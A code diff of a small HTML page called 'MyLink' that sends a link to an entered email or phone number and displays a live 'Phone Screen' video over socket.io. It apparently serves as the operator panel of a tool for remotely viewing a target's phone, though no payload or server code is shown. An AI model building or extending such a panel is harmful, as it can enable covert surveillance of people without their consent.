@@ -2,24 +2,23 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>MyLink Ultimate</title>
+  <title>MyLink</title>
   <style>
-    body {background:#111; color:#0f0; font-family:Arial; text-align:center; padding:20px;}
-    input{width:90%; padding:15px; margin:10px; font-size:18px; border:none; border-radius:10px;}
-    button{width:90%; padding:15px; background:#0f0; color:#000; border:none; border-radius:10px; font-weight:bold; font-size:18px;}
-    #s{margin:20px 0; font-size:20px;}
-    video{width:100%; max-width:600px; border:3px solid #0f0; border-radius:15px; margin-top:20px; background:#000;}
+    body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:20px}
+    input,button{width:90%;padding:15px;margin:10px;font-size:18px;border:none;border-radius:8px}
+    input{background:#222;color:#0f0}
+    button{background:#0f0;color:#000;font-weight:bold}
+    #s{margin:20px;font-size:20px}
+    video{width:100%;max-width:600px;border:3px solid #0f0;border-radius:10px;background:#000}
   </style>
 </head>
 <body>
-  <h1>MyLink Ultimate</h1>
-  <p>Enter email or phone number</p>
-  <input id="t" placeholder="example@gmail.com OR 0712345678">
+  <h1>MyLink</h1>
+  <input id="t" placeholder="email or +254712345678">
   <button onclick="go()">SEND LINK</button>
   <div id="s"></div>
   <h2>Phone Screen</h2>
-  <video id="v" autoplay playsinline controls></video>
+  <video id="v" autoplay playsinline></video>
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
@@ -37,13 +36,12 @@
 
     async function go() {
       const target = document.getElementById('t').value.trim();
-      if (!target) return s("Enter something");
+      if (!target) return s("Enter email or phone");
       s("Sending...");
-      const r = await fetch(`/send?target=${encodeURIComponent(target)}`);
+      const r = await fetch("/send?target=" + encodeURIComponent(target));
       document.getElementById('s').innerHTML = await r.text();
     }
-
-    function s(m) { document.getElementById('s').innerHTML = '<p>' + m + '</p>'; }
+    function s(m) { document.getElementById('s').innerHTML = "<p>" + m + "</p>"; }
   </script>
 </body>
 </html>
